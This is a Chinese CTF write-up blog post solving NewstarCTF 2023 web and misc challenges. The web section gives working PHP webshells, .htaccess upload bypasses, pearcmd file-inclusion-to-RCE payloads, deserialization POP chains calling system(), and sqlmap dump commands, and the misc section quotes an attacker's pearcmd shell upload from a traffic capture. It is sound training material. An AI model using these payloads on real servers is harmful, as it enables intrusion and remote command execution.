---
title: NewstarCTF 2023 
description: web&misc wp
tags:
  - CTF
  - MISC
  - WEB
categories:
  - write up
cover: 'https://tuchuang.voooe.cn/images/2024/03/19/49bbec22e6344630a373e20583633cb2.jpg'
abbrlink: NewstarCTF2023
date: 2024-03-08 21:24:00
---
## web

### [WEEK1]泄漏的秘密

 备份文件泄露



Dirsearch 扫到 www.zip

![](https://s2.loli.net/2024/03/08/2LjWAMxwH9IYlVp.png)

![](https://s2.loli.net/2024/03/08/dJrjB2qeyN34SLT.png)

![](https://s2.loli.net/2024/03/08/EOZnLRvl7IQgY6K.png)

![](https://s2.loli.net/2024/03/08/kO2hNvJjpTKrcow.png)

### [WEEK1]Begin of Upload

文件上传 一句话木马 js 前端绕过



正常传一句话木马

![](https://s2.loli.net/2024/03/08/ClwhGc2BSaMDzkQ.png)

按要求改 php 为 jpg，上传抓包把后缀名改回 php 之后发现成功

![](https://s2.loli.net/2024/03/08/OVpy2h9MtTCrxSv.png)

访问执行命令抓 flag 即可

![](https://s2.loli.net/2024/03/08/balIKzu6WFNDh8L.png)

直接关掉 js 也可以

![](https://s2.loli.net/2024/03/08/9Qv8aTZ4SGylYXo.png)

### [WEEK1]ErrorFlask

报错回显



![](https://s2.loli.net/2024/03/08/k12mf4wRgN7PbtU.png)

类似一个加法计算器的功能

![](https://s2.loli.net/2024/03/08/BeMtEL9JvZ5KQPr.png)

传值为字符时报错

![](https://s2.loli.net/2024/03/08/zZjdNtOanKr9EPg.png)

源码搜到 flag...

### [WEEK1]Begin of Http

http 协议伪造



同 moectf 2023 web http

paylaod：

```python
POST /?ctf=1 
User-Agent: NewStarCTF2023
Referer:newstarctf.com
Cookie: power=ctfer
X-Real-IP:127.0.0.1

secret=n3wst4rCTF2023g00000d
```

![](https://s2.loli.net/2024/03/08/va8kqch6d2RDofK.png)

### [WEEK1]Begin of PHP

 php 特性



```php
<?php
error_reporting(0);
highlight_file(__FILE__);

if(isset($_GET['key1']) && isset($_GET['key2'])){
    echo "=Level 1=<br>";
    if($_GET['key1'] !== $_GET['key2'] && md5($_GET['key1']) == md5($_GET['key2'])){
        $flag1 = True;
    }else{
        die("nope,this is level 1");
    }
}

if($flag1){
    echo "=Level 2=<br>";
    if(isset($_POST['key3'])){
        if(md5($_POST['key3']) === sha1($_POST['key3'])){
            $flag2 = True;
        }
    }else{
        die("nope,this is level 2");
    }
}

if($flag2){
    echo "=Level 3=<br>";
    if(isset($_GET['key4'])){
        if(strcmp($_GET['key4'],file_get_contents("/flag")) == 0){
            $flag3 = True;
        }else{
            die("nope,this is level 3");
        }
    }
}

if($flag3){
    echo "=Level 4=<br>";
    if(isset($_GET['key5'])){
        if(!is_numeric($_GET['key5']) && $_GET['key5'] > 2023){
            $flag4 = True;
        }else{
            die("nope,this is level 4");
        }
    }
}

if($flag4){
    echo "=Level 5=<br>";
    extract($_POST);
    foreach($_POST as $var){
        if(preg_match("/[a-zA-Z0-9]/",$var)){
            die("nope,this is level 5");
        }
    }
    if($flag5){
        echo file_get_contents("/flag");
    }else{
        die("nope,this is level 5");
    }
}
```

**Level 1

md5的弱类型比较  

Leve1 2

md5和sha1的强类型比较

数组绕过**

[PHP—MD5和sha1绕过_php字符串弱不等,sha1强相等-CSDN博客](https://blog.csdn.net/cosmoslin/article/details/120973888?ops_request_misc=&request_id=&biz_id=102&utm_term=sha1%E5%BC%BA%E7%B1%BB%E5%9E%8B&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-120973888.142^v94^chatsearchT3_1&spm=1018.2226.3001.4187)
**Level 3

考察strcmp()漏洞

数组绕过**

[Strcmp()函数漏洞_strcmp漏洞_cop_g的博客-CSDN博客](https://blog.csdn.net/cosmoslin/article/details/120973888?ops_request_misc=&request_id=&biz_id=102&utm_term=sha1%E5%BC%BA%E7%B1%BB%E5%9E%8B&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-120973888.142^v94^chatsearchT3_1&spm=1018.2226.3001.4187)
**Level 4

Is_numric() 检查变量是否为数字或数字字符串

php中数组一定大于数字类型

数组绕过**

[php 数组和数字类型的比较 - 建伟F4nniu - 博客园](https://blog.csdn.net/qq_45694932/article/details/120162029)
**Level 5

要求所有post传参的值都不能为数字和大小写字母（标点符号绕过）

并且要flag5变量为真（只要里面有值就为真）

extract()漏洞导致$flag5可被覆盖**

[extract变量覆盖漏洞-CSDN博客](https://blog.csdn.net/qq_43677324/article/details/88361892)

![](https://s2.loli.net/2024/03/08/VAXfPzWoOtEucQY.png)

### [WEEK1]R!C!E!

 md5 爆破，非法参数名，关键字过滤



![](https://s2.loli.net/2024/03/08/zwVySHvo9c2xaIM.png)

**题目要求 md5($password)的前六位为 c4d038，这里用爆破脚本**

**gpt 写的简单代码，凑合用**

```python
import hashlib

target_prefix = 'c4d038'  # 目标前缀
characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'  # 可能的字符集

# 逐个尝试所有可能的组合
for a in characters:
    for b in characters:
        for c in characters:
            for d in characters:
                for e in characters:          ##要爆破几位就多几个
                    potential_text = a + b + c + d + e ##这里也要加上
                    md5_hash = hashlib.md5(potential_text.encode()).hexdigest()

                    if md5_hash.startswith(target_prefix):
                        print("找到匹配的原文:", potential_text)
                        exit()

print("未找到匹配的原文")
```

![](https://s2.loli.net/2024/03/08/sk59biYepxBfTOX.png)

**e_v.a.l 涉及非法变量名**

**谈一谈 PHP 中关于非法参数名传参问题_php 的非法传参-CSDN 博客**

**system 用 echo 绕过，cat 用 tac 绕过，flag 用法 f*绕过，ls 可以用 dir 绕过**

**更多姿势 ****RCE 总结_C1yas0 的博客-CSDN 博客**

![](https://s2.loli.net/2024/03/08/Zk3SPOuoYzaw9N7.png)

### [WEEK1]EasyLogin

密码爆破，越权



![](https://s2.loli.net/2024/03/08/e9VrM5RIjZWcPQL.png)

admin 123456  默认登录

![](https://s2.loli.net/2024/03/08/ZOGR4mEizJAhuj5.png)

这里用 bp 字典爆破账户和密码即可

![](https://s2.loli.net/2024/03/08/s4CnOqxkc6H1QLz.png)

密码被 md5 加密了，爆破时加上 md5 条件即可

[BurpSuite 爆破(Intruder)模块四种模式介绍-CSDN 博客](https://blog.csdn.net/weixin_43487849/article/details/116084562)

![](https://s2.loli.net/2024/03/08/GpB3gwaUNIbZSnX.png)

字典自己做，这里直接说明 admin 000000 为账号密码（也算是常规密码，建议是试出来的，节省时间）

![](https://s2.loli.net/2024/03/08/H3v6qykJLNMxrmZ.png)

抓登录的包发送可以看到一个 passport/xxx.php 的目录

直接访问是不行的，这里抓访问的包

![](https://s2.loli.net/2024/03/08/5wQzM3vZEHATamD.png)

注意这里是 post 请求，要把 passport 的值传进去，这里先 load URL 然后在 URL 处添加目录即可

BP 抓包，发包

![](https://s2.loli.net/2024/03/08/ZgYkvcXMUD62aHG.png)

> 手快一点哦)

###    [WEEK2] 游戏高手

 js



js 文件中找到对应成绩的参数

![](https://s2.loli.net/2024/03/08/BsewK7SMDOzn2dJ.png)

控制台：

var gameScore=9999999999999

再玩游戏直接送

![](https://s2.loli.net/2024/03/08/7d8OrhaTXACcfiq.png)

### [WEEK2] include 0。0

文件包含



![](https://s2.loli.net/2024/03/08/JdpyB5r3C9hRNil.png)

[CTF 中文件包含的几种不常规利用姿势总结](https://cloud.tencent.com/developer/article/2145160)

**?file=php://filter/convert.iconv.ASCII.UCS-2BE/resource=flag.php**

### [WEEK2] ez_sql

常规 sql 注入



> 手工注入不作演示，这里用 sqlmap

sqlmap -u [http://e36154c0-2c7a-4875-b4e1-fe82c84fb5fc.node4.buuoj.cn/?id](http://e36154c0-2c7a-4875-b4e1-fe82c84fb5fc.node4.buuoj.cn:81/?id)=

发现可以通过 get id 进行 sql 注入

xxx --dbs  查所有库

![](https://s2.loli.net/2024/03/08/qhRSlP68pZQHYfA.png)

xxx -D ctf --tables  查表

![](https://s2.loli.net/2024/03/08/KM24mXP13DoCfkh.png)

xxx -D ctf -T here_is_flag --columns   查字段

![](https://s2.loli.net/2024/03/08/zsXP9YtOGgMWC7i.png)

xxx -D ctf -T here_is_flag -C flag --dump  查内容

![](https://s2.loli.net/2024/03/08/RvNfFUuY5G8dE9p.png)

### [WEEK2] Upload again!

一句话木马写法，.htaccess

![](https://s2.loli.net/2024/03/08/4dUtQigIxuynwb5.png)

**后缀不能是php，那就得传.htaccess试试了**

![](https://s2.loli.net/2024/03/08/1WyRzwrj5AK6Xv9.png)

>更多写法：
<FilesMatch "xxx.jpg"> #指定文件转 php
SetHandler application/x-httpd-php
</FilesMatch>

**功能：把当前目录和子目录的.jpg文件当作php文件处理，再次上传木马**

![](https://s2.loli.net/2024/03/08/uDOlTySgmHRzwcZ.png)

**木马格式修改为：<script language='php'>@eval($_POST['aaa']);</script>
等同于<?php eval($_POST['aaa']); ?>
这次成功了，执行系统命令即可**

![](https://s2.loli.net/2024/03/08/8f7Rtga9pYFxXOI.png)

###    [WEEK2]  Unserialize？

 签到反序列化



构造 payload：

![](https://s2.loli.net/2024/03/08/OD6WZBERn78ozxH.png)

**POST：unser=O:4:"evil":1:{s:3:"cmd";s:33:"nl /th1s_1s_fffflllll4444aaaggggg";}**

![](https://s2.loli.net/2024/03/08/GCHsR7jvXLoFWmp.png)

### [WEEK2]   R!!C!!E!!

无参 RCE + 过滤



![](https://s2.loli.net/2024/03/08/Kz63HSouAeiXw74.png)

进去拿到提示，存在信息泄露，F12 简单看没有东西

dirsearch 扫一下

![](https://s2.loli.net/2024/03/08/2jO6zebvAx7IMNW.png)

全部是 429（Too Many Requests）

加个时间限制，-s 1   （间隔一秒）[dirsearch 用法大全](https://blog.csdn.net/qq_43936524/article/details/115271837)

![](https://s2.loli.net/2024/03/08/brAwZ3FxDJmMlti.png)

.git 泄露

用 githack 扫一下

![](https://s2.loli.net/2024/03/08/iTK2tx6Ooc8yqGB.png)

![](https://s2.loli.net/2024/03/08/HVCtWDlirQLMcwF.png)

找到文件了，访问/bo0g1pop.php

![](https://s2.loli.net/2024/03/08/g5DGqXoKPs7fd26.png)

[RCE 篇之无参数 rce - 学安全的小白 - 博客园](https://www.cnblogs.com/pursue-security/p/15406272.html)

![](https://s2.loli.net/2024/03/08/ObnAI2w79tJELNP.png)

无参 RCE，但是本题还有过滤，经过一番搜索最后成功构造 payload：

`?star=eval(next(getallheaders()));
user-Agent：system('tac /flag');`

![](https://s2.loli.net/2024/03/08/VpfR32PWnT1Lyqa.png)

> 我猜是因为第一个是 Upgrade，UA 在第二个所以用 next()

附锅老师的操作：

![](https://s2.loli.net/2024/03/08/QHi1UxFILdEmaZN.png)

### [WEEK3] Include 🍐

pearcmd



![](https://s2.loli.net/2024/03/08/s46Wr5VeOz8MA9x.png)

[Docker PHP 裸文件本地包含综述 | 离别歌](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html)

![](https://s2.loli.net/2024/03/08/hlveEgsBtDOrZHq.png)

[register_argc_argv 与 include to RCE 的巧妙组合 - Longlone's Blog](https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%20to%20RCE%E7%9A%84%E5%B7%A7%E5%A6%99%E7%BB%84%E5%90%88/)

``Payload:
?file=pearcmd&+config-create+/<?=eval($_POST['a']);?>+/tmp/2.php``

![](https://s2.loli.net/2024/03/08/RH4kQdrzaUPfTZW.png)

**用 BP 传，url 直接传会被编码导致转义**

然后包含文件，include 会执行 2.php 的代码，我们 post 传值即可

![](https://s2.loli.net/2024/03/08/SE9H7ledks8RAvM.png)

### [WEEK3] medium_sql

sqlmap 时间盲注



sqlmap 做就行，注意调线程和时延，直接报不行的

这里只直接给最后的 payload：

sqlmap -u URL/?id=TMP5978 --batch -t 10 --delay 1 -D ctf -T here_is_flag -C flag --dump

![](https://s2.loli.net/2024/03/08/rijIxTKEWayQmAJ.png)

### [WEEK3] POP Gadget

 反序列化



pop 链：

whitegod(func=system,var=ls) -> ctf(handle=$whitegod) -> handle(obj=$ctf) -> super(obj=$handle) -> then(func=$super) -> begin(name=$then)

EXP:

```php
<?php

class Begin{
    public $name;
}

class Then{
    public $func;
}

class Handle{
    public $obj;
}

class Super{
    public $obj;
}

class CTF{
    public $handle;

}

class WhiteGod{
    public $func;
    public $var;
}

$whitegod=new WhiteGod();
$ctf=new CTF();
$super=new Super();
$handle=new Handle();
$then=new Then();
$begin=new Begin();

$whitegod->func='system';
$whitegod->var='ls';
$ctf->handle=$whitegod;
$handle->obj=$ctf;
$super->obj=$handle;
$then->func=$super;
$begin->name=$then;


echo serialize($begin);
?>
```

**Payload:
O:5:"Begin":1:{s:4:"name";O:4:"Then":1:{s:4:"func";O:5:"Super":1:{s:3:"obj";O:6:"Handle":1:{s:3:"obj";O:3:"CTF":1:{s:6:"handle";O:8:"WhiteGod":2:{s:4:"func";s:6:"system";s:3:"var";s:9:"tac /flag";}}}}}}
**


![](https://s2.loli.net/2024/03/08/RAzrUYThCmtSXPx.png)


## misc

### CyberChef's Secret

  base32 58 64


![](https://s2.loli.net/2024/03/08/Ksln7oPb86vAVyW.png)

[cyberchef.org](https://cyberchef.org/)

![](https://s2.loli.net/2024/03/08/9KwfvjNBxZWqYuS.png)

### 机密图片

lsb 隐写



![](https://s2.loli.net/2024/03/08/lSzoZwFBRqmdgPD.png)

扫码没啥消息

stegsolve 发现顶部有字符串

![](https://s2.loli.net/2024/03/08/mjtRuUq2nDAx7by.png)

Data extract

选最低位即可

![](https://s2.loli.net/2024/03/08/Q7hq8zKYOP9ijnI.png)

### 流量！鲨鱼！

流量分析



![](https://s2.loli.net/2024/03/08/W3LMuKFkT7gBRmn.png)

导出 http 对象

![](https://s2.loli.net/2024/03/08/jQsko2giLywNqAd.png)

导出 flag 文件

![](https://s2.loli.net/2024/03/08/iptnxkIA2XbOgl5.png)

![](https://s2.loli.net/2024/03/08/uNPxd2BLnfphjQT.png)

### 压缩包们

binwalk 密码爆破



![](https://s2.loli.net/2024/03/08/QETDKrvtecHli7M.png)

无后缀，010 打开

![](https://s2.loli.net/2024/03/08/Z7bOrDYvTxJpLs3.png)

里面有压缩文件，binwalk 分离

![](https://s2.loli.net/2024/03/08/PQHlBAWjknaT3hw.png)

![](https://s2.loli.net/2024/03/08/Y7VILTqwe45M1Rp.png)

![](https://s2.loli.net/2024/03/08/Aj5JYk4Ci3BHZpR.png)

备注解密得到字符串 **I like six-digit numbers because they are very concise and easy to remember.**

6 位数字密码爆破，这里用 zipello

![](https://s2.loli.net/2024/03/08/DVxAG9QJfTePHZa.png)

打开得到 flag

![](https://s2.loli.net/2024/03/08/7ZiTAFQpruP6Yqj.png)

### 空白格

   whitespace



![](https://s2.loli.net/2024/03/08/Hh8Q6XAM5ECxUBr.png)

起初以为是 snow，后来了解到 whitespace

[whitespace 在线运行,在线工具，在线编译 IDE_w3cschool](https://www.w3cschool.cn/tryrun/runcode?lang=whitespace)

![](https://s2.loli.net/2024/03/08/m1RUQfXicYnyGNZ.png)

复制粘贴运行得到 flag

### 隐秘的眼睛

silenteye



![](https://s2.loli.net/2024/03/08/MchoLlKNx2H5YzZ.png)

![](https://s2.loli.net/2024/03/08/dmPBwh2fYOcgvx8.png)

全部默认解密即可

### 新建 Word 文档

word



打开都是空白，标题那里随便点一个就出来了

![](https://s2.loli.net/2024/03/08/lt4CEbdesXvLIVT.png)

[新约佛论禅/佛曰加密 - PcMoe!](http://hi.pcmoe.net/Buddha.html)

![](https://s2.loli.net/2024/03/08/BoD9nNWFOtM5fT1.png)

**flag{Th1s_F0_1s_s00_Cyp3r_495586e3df3a}**

### 永不消逝的电波

morse



[Morse Code Adaptive Audio Decoder](https://morsecode.world/international/decoder/audio-decoder-adaptive.html)

![](https://s2.loli.net/2024/03/08/qc5dCJteZDh6HuN.png)

**flag{thebestctferisyou}**

###   base!

   base64 隐写



[https://blog.csdn.net/qq_43431158/article/details/109525795](https://blog.csdn.net/qq_43431158/article/details/109525795)

脚本：

```python
import base64

def get_base64_diff_value(s1, s2):
    base64chars = b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    res = 0
    for i in range(len(s2)):
        if s1[i] != s2[i]:
            return abs(base64chars.index(s1[i]) - base64chars.index(s2[i]))
    return res

def solve_stego():
    with open('xxx', 'rb') as f: #文件放这里
        file_lines = f.readlines()
        bin_str = b''  # 使用字节串
        for line in file_lines:
            steg_line = line.replace(b'\n', b'')
            norm_line = base64.b64encode(base64.b64decode(steg_line)).replace(b'\n', b'')
            diff = get_base64_diff_value(steg_line, norm_line)
            print(diff)
            pads_num = steg_line.count(b'=')
            if diff:
                bin_str += bin(diff)[2:].zfill(pads_num * 2).encode()  # 将二进制字符串转换为字节串
            else:
                bin_str += b'0' * pads_num * 2
            print(goflag(bin_str))

def goflag(bin_str):
    res_str = b''
    for i in range(0, len(bin_str), 8):
        res_str += bytes([int(bin_str[i:i + 8], 2)])
    return res_str.decode()  # 将字节串转换为字符串

if __name__ == '__main__':
    solve_stego()
```

![](https://s2.loli.net/2024/03/08/ur1sfTL5kANHDyU.png)

![](https://s2.loli.net/2024/03/08/xrmLPQ2yt7GvhjE.png)

### 1-序章

sql 盲注日志分析



先把文件 url 解码一下，然后分析

![](https://s2.loli.net/2024/03/08/4VgamyubWnDrHZ3.png)

1,1 2,1 3,1 ...x,1

当注入到某一位的正确字符后会结束这一位的爆破，进行下一位的注入

每一个的最后一行的数字转 ascii 字符即可

手撸出来的

![](https://s2.loli.net/2024/03/08/7fzZC8IF9QmiyRj.png)

官方脚本：

```python
# coding:utf-8
import re
import urllib
 
f = open('access.log','r')
lines = f.readlines()
datas = []
for line in lines:
    t = urllib.unquote(line) 
    datas.append(t)
 
flag_ascii = {}  
for data in datas:
    matchObj = re.search( r'user\),(.*?),1\)\)=(.*?),sleep', data)
    if matchObj:
        key = int(matchObj.group(1))
        value = int(matchObj.group(2))
        flag_ascii[key] = value
        
flag = ''
for value in flag_ascii.values():
    flag += chr(value)
    
print flag
```

### WebShell 的利用

多层嵌套解密，rce



打开 index.php 里面是这个代码，xxx 是大量的密文

<?php

eval(str_rot13(convert_uudecode(str_rot13(base64_decode('xxx')))));

?>

手动进行一次解密后发现还是这个模式的解密

eval(str_rot13(convert_uudecode(str_rot13(base64_decode('xxx（此时的密文量减少了）')))));

脚本解密，发现解密十次可以拿到 payload

```php
<?php

function custom_decrypt($ciphertext, $num_iterations) {
    for ($i = 0; $i < $num_iterations; $i++) {
        $decoded = base64_decode($ciphertext);
        $decoded = str_rot13($decoded);

        // UU解码
        $decoded = convert_uudecode($decoded);
                $decoded = str_rot13($decoded);
        if (substr($decoded, 0, 57) === "eval(str_rot13(convert_uudecode(str_rot13(base64_decode('" && substr($decoded, -7) === "')))));") {
            $decoded = substr($decoded, 57, -7);
        }

        $ciphertext = $decoded;
    }

    return $ciphertext;
}

// 输入你的密文和解密次数
$encrypted_text = 'xxx';
$iterations = 10;

// 调用函数进行解密
$decrypted_text = custom_decrypt($encrypted_text, $iterations);
echo $decrypted_text;

?>
```

![](https://s2.loli.net/2024/03/08/oHXOm4tNgZ8iPqk.png)

套上前面的 eval()

即为 eval(error_reporting(0);($_GET['7d67973a'])($_POST['9fa3']););

前面 get 的值作为函数

后面 post 的值为函数内的内容

![](https://s2.loli.net/2024/03/08/xF1zTjNiGUpachL.png)

### Jvav

java 盲水印



[CTF-图片隐写那些事儿 - Mssn Harvey - CTFer && DreamRedteam](https://harvey.plus/index.php/archives/71/#toc-Java%E7%9B%B2%E6%B0%B4%E5%8D%B0)

**java -jar BlindWatermark-v0.0.3-windows-x86_64.jar decode -c 题目.jpg 解密.jpg**

![](https://s2.loli.net/2024/03/08/uXYfb9ZgdRKVrML.png)

###    阳光开朗大男孩

   社会主义解密  emoji-aes 解密



两个文件，secret.txt 是社会主义

![](https://s2.loli.net/2024/03/08/aLWgYVTB76qU9yZ.png)

解密得到   this_password_is_s000_h4rd_p4sssw0rdddd

观察到 is 后面的才用数字代替字母的格式，猜测密码为：s000_h4rd_p4sssw0rdddd

flag.txt 是 emoji-aes 加密

![](https://s2.loli.net/2024/03/08/IyPgDLrzSf7YM2J.png)

在线：[https://aghorler.github.io/emoji-aes/](https://aghorler.github.io/emoji-aes/)

![](https://s2.loli.net/2024/03/08/IaKzhNg5FQ7AyEn.png)

### 大怨种

gif 抓帧 汉信码



题目给到的是 gif 图，观察有一张二维码闪过

Stegsolve 梭

![](https://s2.loli.net/2024/03/08/bqwNulfoS4IWxnY.png)

[在线汉信码识别,汉信码解码 - 兔子二维码](https://tuzim.net/hxdecode/)

![](https://s2.loli.net/2024/03/08/Dpl9VLqfX4GoIjR.png)

### 2-分析

取证 流量分析



![](https://s2.loli.net/2024/03/08/ioZIuOdqgDW2X4A.png)

> flag{md5(攻击者登录使用的用户名_存在漏洞的文件名_WebShell 文件名)}

wireshark 打开，检查 http 流量

length 从大到小来看

先看到 login.php 里面发送了请求

![](https://s2.loli.net/2024/03/08/eirTNIFGmkB7RAX.png)

追踪 http

![](https://s2.loli.net/2024/03/08/aeUsXljrF8ubtyg.png)

找到用户名：best_admin

继续往下看可以看到：

![](https://s2.loli.net/2024/03/08/1X8UsTjSgknFa4t.png)

/index.php?page=/../../../../usr/share/php/pearcmd&+config-create+/&<?=system($_GET['a'])?>+/var/www/html/wh1t3g0d.php

这里是在漏洞文件里进行了远程木马的上传，木马文件为 wh1t3g0d.php，漏洞文件为 index.php

    shell文件：wh1t3g0d.php
    漏洞文件：index.php
    用户名：best_admin

![](https://s2.loli.net/2024/03/08/gRW2EtscFDbPxh7.png)

**flag{4069afd7089f7363198d899385ad688b}**

### 滴滴滴

dtmf 拨号音  steghide



拿到音频听了一下发现是手机拨号的按键音

命令：dtmf2num xxx.wav

![](https://s2.loli.net/2024/03/08/NxK4EhPlc2X9OYp.png)

密码：52563319066

还有一张图，尝试 steghide 解密

成功得到 flag

###  键盘侠

   usb 键盘流量提取



参考：[CTF 流量分析常见题型(二)-USB 流量_ctf usb 流量分析-CSDN 博客](https://blog.csdn.net/qq_43625917/article/details/107723635)

tshark -r xxx.pcapng -T fields -e usb.capdata > output.txt  （提取 usb）

tshark -r xxx.pcapng -T fields -e usb.capdata | sed '/^\s*$/d' > output.txt  （并且去掉空行）

> 但是这里报错了，并且按网上方法改也没成功，所以用了别的方法

tshark -T json -r xxx.pcapng >123.json （改 json 格式输出）

然后只提取 usbhid.data 的内容

strings 123.json | grep "usbhid.data" > 123.txt

![](https://s2.loli.net/2024/03/08/MkTtCXh5G8em9Lp.png)

调整一下格式，删去前缀和引号

![](https://s2.loli.net/2024/03/08/YoNEhn76tkViurO.png)

上脚本：

	python
	#!/usr/bin/env python
	# -*- coding:utf-8 -*-
	
	normalKeys = {"04":"a", "05":"b", "06":"c", "07":"d", "08":"e", "09":"f", "0a":"g", "0b":"h", "0c":"i", "0d":"j", "0e":"k", "0f":"l", "10":"m", "11":"n", "12":"o", "13":"p", "14":"q", "15":"r", "16":"s", "17":"t", "18":"u", "19":"v", "1a":"w", "1b":"x", "1c":"y", "1d":"z","1e":"1", "1f":"2", "20":"3", "21":"4", "22":"5", "23":"6","24":"7","25":"8","26":"9","27":"0","28":"<RET>","29":"<ESC>","2a":"<DEL>", "2b":"\t","2c":"<SPACE>","2d":"-","2e":"=","2f":"[","30":"]","31":"\\","32":"<NON>","33":";","34":"'","35":"<GA>","36":",","37":".","38":"/","39":"<CAP>","3a":"<F1>","3b":"<F2>", "3c":"<F3>","3d":"<F4>","3e":"<F5>","3f":"<F6>","40":"<F7>","41":"<F8>","42":"<F9>","43":"<F10>","44":"<F11>","45":"<F12>"}
	shiftKeys = {"04":"A", "05":"B", "06":"C", "07":"D", "08":"E", "09":"F", "0a":"G", "0b":"H", "0c":"I", "0d":"J", "0e":"K", "0f":"L", "10":"M", "11":"N", "12":"O", "13":"P", "14":"Q", "15":"R", "16":"S", "17":"T", "18":"U", "19":"V", "1a":"W", "1b":"X", "1c":"Y", "1d":"Z","1e":"!", "1f":"@", "20":"#", "21":"$", "22":"%", "23":"^","24":"&","25":"*","26":"(","27":")","28":"<RET>","29":"<ESC>","2a":"<DEL>", "2b":"\t","2c":"<SPACE>","2d":"_","2e":"+","2f":"{","30":"}","31":"|","32":"<NON>","33":"\"","34":":","35":"<GA>","36":"<","37":">","38":"?","39":"<CAP>","3a":"<F1>","3b":"<F2>", "3c":"<F3>","3d":"<F4>","3e":"<F5>","3f":"<F6>","40":"<F7>","41":"<F8>","42":"<F9>","43":"<F10>","44":"<F11>","45":"<F12>"}
	output = []
	keys = open('xxx.txt')  #数据文件路径
	for line in keys:
	try:
	    if line[0]!='0' or (line[1]!='0' and line[1]!='2') or line[3]!='0' or line[4]!='0' or line[9]!='0' or line[10]!='0' or line[12]!='0' or line[13]!='0' or line[15]!='0' or line[16]!='0' or line[18]!='0' or line[19]!='0' or line[21]!='0' or line[22]!='0' or line[6:8]=="00":
	         continue
	    if line[6:8] in normalKeys.keys():
	        output += [[normalKeys[line[6:8]]],[shiftKeys[line[6:8]]]][line[1]=='2']
	    else:
	        output += ['[unknown]']
	except:
	    pass
	keys.close()
	
	flag=0
	output_text = "".join(output)
	for i in range(len(output)):
	try:
	    a=output.index('<DEL>')
	    del output[a]
	    del output[a-1]
	except:
	    pass
	for i in range(len(output)):
	try:
	    if output[i]=="<CAP>":
	        flag+=1
	        output.pop(i)
	        if flag==2:
	            flag=0
	    if flag!=0:
	        output[i]=output[i].upper()
	except:
	    pass
	
	output_text = "".join(output)
	with open('xxx.txt', 'w') as output_file: #先创一个txt，然后把路径放这里
	output_file.write(output_text)

![](https://s2.loli.net/2024/03/08/XT2V4b6IhEnmeA1.png)

去掉 unknow 和 space 即可

![](https://s2.loli.net/2024/03/08/V7SJvL5OGCZUrsg.png)

大写转小写：flag{9919aeb2-a450-2f5f-7bfc-89df4bfa8584}

### R 通大残

zsteg



![](https://s2.loli.net/2024/03/08/fw93MSJ8ZbIti5A.png)

顶部有东西
直接 zsteg -a 查所有信道

![](https://s2.loli.net/2024/03/08/JScCmpkBM25ZWgh.png)

### Nmap

nmap 流量分析



[Nmap 常见扫描方式流量分析 - fan-tastic - 博客园](https://www.cnblogs.com/zhaof/p/13264836.html)

![](https://s2.loli.net/2024/03/08/zbuXKJM4E7jR2Uo.png)

直接搜索[RST]相关的端口

例如搜到 80 的：

![](https://s2.loli.net/2024/03/08/wTfaPzCBeb6uQys.png)

总共找到：80,3306,5000,7000,8021,9000

套上 flag 交了即可

### 3-溯源

冰蝎流量分析



![](https://s2.loli.net/2024/03/08/pEviBmeGClVUdoZ.png)

[记一次解密 wireshark 抓取的冰蝎通信流量 - Zh1z3ven - 博客园](https://www.cnblogs.com/CoLo/p/13233359.html)

从 wireshark 导出对象 http 找文件

![](https://s2.loli.net/2024/03/08/OWLQmvuTqacn7U2.png)

选 app...的类型然后第一个 shell.php 拿下来看看

![](https://s2.loli.net/2024/03/08/KUEBf4JIhXW6Nzo.png)

是 base64 和 url 编码的混合体，不用管直接解密，可以看到这次冰蝎的 aes 加密的密钥 **e45e329feb5d925b**

> 后续都是先进行 aes 解密再进行 base64 解密得到数据的

接着选到文本类型，进行数据大小的降序排序

![](https://s2.loli.net/2024/03/08/N8vYt1VX7DB5TWs.png)

导出第一个 1.php，先进行 aes 解密，再 base64

[AES 批量加密解密 - 在线工具](http://tools.bugscaner.com/cryptoaes/)

![](https://s2.loli.net/2024/03/08/9EKcztl3ksJDyZO.png)

msg 后面的密文解密 base64 得到

![](https://s2.loli.net/2024/03/08/w9Qm2kg1PSKj6dF.png)

在数据最后面可以得到内网 IP，再进行 base64 解密即可

![](https://s2.loli.net/2024/03/08/BDmjpUf6CbsPeiF.png)

IP:172.17.0.2

再回到导出对象，进行升序，选择数据大小最小的 1.php

![](https://s2.loli.net/2024/03/08/Rvneyj7Ip9YDlTM.png)

老办法操作后可以得到用户名

![](https://s2.loli.net/2024/03/08/dR2sGtipWqzXHrO.png)

![](https://s2.loli.net/2024/03/08/duOqPtCxX8vejJb.png)

交上 flag{www-data_172.17.0.2}成功

### 依旧是空白

   宽高 snow 隐写



图片修改宽高看到 password

![](https://s2.loli.net/2024/03/08/9tFeAgdqGuBmwM1.png)

空白格涉及密码的可以想到 snow 隐写

![](https://s2.loli.net/2024/03/08/HDu48XgncGz3taK.png)

### 第一次取证

内存取证 volatility


> 这题要用 python2 运行 volatility2

![](https://s2.loli.net/2024/03/08/NKfnamlHXBLQjg7.png)

	E:\python2.7.18\python.exe vol.py -f C:\Users\Nanian233\Desktop\dycqz.raw imageinfo

![](https://s2.loli.net/2024/03/08/yZ4mpVXfevF1hsA.png)

取第一个系统 Win7SP1x64，**显示有关编辑控件（曾经编辑过的内容）的信息 editbox**

	E:\python2.7.18\python.exe vol.py -f C:\Users\Nanian233\Desktop\dycqz.raw 
	--profile=Win7SP1x64 editbox

![](https://s2.loli.net/2024/03/08/tRrPVwzfUM8ciKI.png)

解密下面的字符串

![](https://s2.loli.net/2024/03/08/b3k5DaHUS1NduJK.png)


### 隐秘的图片

二维码异或


![](https://s2.loli.net/2024/03/08/IXtF6seJ3aUSiP9.png)

Stegsolve 打开

两张图异或

![](https://s2.loli.net/2024/03/08/GR2q5EZHtFVsNi7.png)

扫码即可

![](https://s2.loli.net/2024/03/08/tdUhnlgmLszCReu.png)